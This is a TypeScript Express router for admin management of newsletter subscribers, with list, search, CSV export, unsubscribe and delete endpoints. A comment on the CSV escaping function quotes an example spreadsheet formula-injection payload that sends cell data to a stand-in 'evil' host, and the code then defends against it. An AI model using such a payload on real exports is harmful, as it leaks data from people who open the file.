import { Router, type IRouter } from "express";
import { desc, sql, and, eq, gte, ilike, isNull, type SQL } from "drizzle-orm";
import { db, newsletterSubscribersTable } from "@workspace/db";
import { requireRole } from "../lib/auth";
import { logger } from "../lib/logger";

const router: IRouter = Router();

const MAX_LIMIT = 200;
const DEFAULT_LIMIT = 50;
const MAX_EXPORT = 50000;

function parseLimit(raw: unknown): number {
  const n = Number(raw);
  if (!Number.isFinite(n) || n <= 0) return DEFAULT_LIMIT;
  return Math.min(Math.floor(n), MAX_LIMIT);
}

function parseOffset(raw: unknown): number {
  const n = Number(raw);
  if (!Number.isFinite(n) || n < 0) return 0;
  return Math.floor(n);
}

function buildWhere(search: string): SQL | undefined {
  const conditions: SQL[] = [isNull(newsletterSubscribersTable.unsubscribedAt)];
  if (search) {
    // Escape LIKE wildcards in user input.
    const escaped = search.replace(/[\\%_]/g, (c) => `\\${c}`);
    conditions.push(ilike(newsletterSubscribersTable.email, `%${escaped}%`));
  }
  return conditions.length === 1 ? conditions[0] : and(...conditions);
}

router.get(
  "/admin/newsletter-subscribers",
  requireRole("admin"),
  async (req, res) => {
    try {
      const search =
        typeof req.query["search"] === "string"
          ? req.query["search"].trim().toLowerCase().slice(0, 320)
          : "";
      const limit = parseLimit(req.query["limit"]);
      const offset = parseOffset(req.query["offset"]);

      const where = buildWhere(search);

      const baseQuery = db
        .select({
          id: newsletterSubscribersTable.id,
          email: newsletterSubscribersTable.email,
          source: newsletterSubscribersTable.source,
          createdAt: newsletterSubscribersTable.createdAt,
        })
        .from(newsletterSubscribersTable);

      const rowsPromise = (where ? baseQuery.where(where) : baseQuery)
        .orderBy(desc(newsletterSubscribersTable.createdAt))
        .limit(limit)
        .offset(offset);

      const totalQuery = db
        .select({ count: sql<number>`count(*)::int` })
        .from(newsletterSubscribersTable);
      const totalPromise = where ? totalQuery.where(where) : totalQuery;

      // Overall stats are always unfiltered (active subscribers only).
      const activeWhere = isNull(newsletterSubscribersTable.unsubscribedAt);
      const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
      const statsTotalPromise = db
        .select({ count: sql<number>`count(*)::int` })
        .from(newsletterSubscribersTable)
        .where(activeWhere);
      const statsRecentPromise = db
        .select({ count: sql<number>`count(*)::int` })
        .from(newsletterSubscribersTable)
        .where(
          and(
            activeWhere,
            gte(newsletterSubscribersTable.createdAt, sevenDaysAgo),
          ),
        );

      const [rows, totalRows, statsTotalRows, statsRecentRows] =
        await Promise.all([
          rowsPromise,
          totalPromise,
          statsTotalPromise,
          statsRecentPromise,
        ]);
      const total = totalRows[0]?.count ?? 0;

      res.setHeader("Cache-Control", "private, no-store");
      return res.json({
        success: true,
        items: rows,
        total,
        limit,
        offset,
        filter: { search: search || null },
        stats: {
          total: statsTotalRows[0]?.count ?? 0,
          last7Days: statsRecentRows[0]?.count ?? 0,
        },
      });
    } catch (err) {
      logger.error({ err }, "admin/newsletter-subscribers list failed");
      return res.status(503).json({
        success: false,
        error: "Database not available",
        message: "Could not load newsletter subscribers.",
      });
    }
  },
);

// CSV cell escaping that also defends against spreadsheet formula injection.
//
// When Excel / Google Sheets / Numbers open a CSV, any cell whose first
// character is one of `=`, `+`, `-`, `@`, TAB or CR is treated as a formula.
// Since `email` and `source` come from end-user input, an attacker could
// register `=HYPERLINK("http://evil/?steal="&A1,"Click")` as their email
// and have it execute when the team opens the export.
//
// Mitigation (per OWASP): prefix a single quote so the cell is treated as
// literal text, then apply normal CSV quoting on top.
function csvEscape(value: string): string {
  let v = value;
  if (v.length > 0 && /^[=+\-@\t\r]/.test(v)) {
    v = `'${v}`;
  }
  if (/[",\n\r]/.test(v)) {
    return `"${v.replace(/"/g, '""')}"`;
  }
  return v;
}

router.get(
  "/admin/newsletter-subscribers.csv",
  requireRole("admin"),
  async (req, res) => {
    try {
      const search =
        typeof req.query["search"] === "string"
          ? req.query["search"].trim().toLowerCase().slice(0, 320)
          : "";
      const where = buildWhere(search);

      const baseQuery = db
        .select({
          email: newsletterSubscribersTable.email,
          source: newsletterSubscribersTable.source,
          createdAt: newsletterSubscribersTable.createdAt,
        })
        .from(newsletterSubscribersTable);

      const rows = await (where ? baseQuery.where(where) : baseQuery)
        .orderBy(desc(newsletterSubscribersTable.createdAt))
        .limit(MAX_EXPORT);

      const lines: string[] = ["email,source,signed_up_at"];
      for (const row of rows) {
        lines.push(
          [
            csvEscape(row.email),
            csvEscape(row.source),
            csvEscape(row.createdAt.toISOString()),
          ].join(","),
        );
      }
      const body = lines.join("\n") + "\n";

      const stamp = new Date().toISOString().slice(0, 10);
      res.setHeader("Content-Type", "text/csv; charset=utf-8");
      res.setHeader(
        "Content-Disposition",
        `attachment; filename="newsletter-subscribers-${stamp}.csv"`,
      );
      res.setHeader("Cache-Control", "private, no-store");
      return res.send(body);
    } catch (err) {
      logger.error({ err }, "admin/newsletter-subscribers csv export failed");
      return res.status(503).json({
        success: false,
        error: "Database not available",
        message: "Could not export newsletter subscribers.",
      });
    }
  },
);

router.patch(
  "/admin/newsletter-subscribers/:id/unsubscribe",
  requireRole("admin"),
  async (req, res) => {
    try {
      const id = String(req.params["id"] ?? "").slice(0, 64);
      if (!id) {
        return res
          .status(400)
          .json({ success: false, error: "Missing subscriber id" });
      }
      const updated = await db
        .update(newsletterSubscribersTable)
        .set({ unsubscribedAt: new Date() })
        .where(
          and(
            eq(newsletterSubscribersTable.id, id),
            isNull(newsletterSubscribersTable.unsubscribedAt),
          ),
        )
        .returning({ id: newsletterSubscribersTable.id });
      if (updated.length === 0) {
        return res.status(404).json({
          success: false,
          error: "Not found",
          message: "Subscriber not found or already unsubscribed.",
        });
      }
      req.log.info({ subscriberId: id }, "admin unsubscribed newsletter subscriber");
      return res.json({ success: true, id });
    } catch (err) {
      logger.error({ err }, "admin/newsletter-subscribers unsubscribe failed");
      return res.status(503).json({
        success: false,
        error: "Database not available",
        message: "Could not unsubscribe the subscriber.",
      });
    }
  },
);

router.delete(
  "/admin/newsletter-subscribers/:id",
  requireRole("admin"),
  async (req, res) => {
    try {
      const id = String(req.params["id"] ?? "").slice(0, 64);
      if (!id) {
        return res
          .status(400)
          .json({ success: false, error: "Missing subscriber id" });
      }
      const deleted = await db
        .delete(newsletterSubscribersTable)
        .where(eq(newsletterSubscribersTable.id, id))
        .returning({ id: newsletterSubscribersTable.id });
      if (deleted.length === 0) {
        return res.status(404).json({
          success: false,
          error: "Not found",
          message: "Subscriber not found.",
        });
      }
      req.log.info({ subscriberId: id }, "admin deleted newsletter subscriber");
      return res.json({ success: true, id });
    } catch (err) {
      logger.error({ err }, "admin/newsletter-subscribers delete failed");
      return res.status(503).json({
        success: false,
        error: "Database not available",
        message: "Could not delete the subscriber.",
      });
    }
  },
);

export default router;
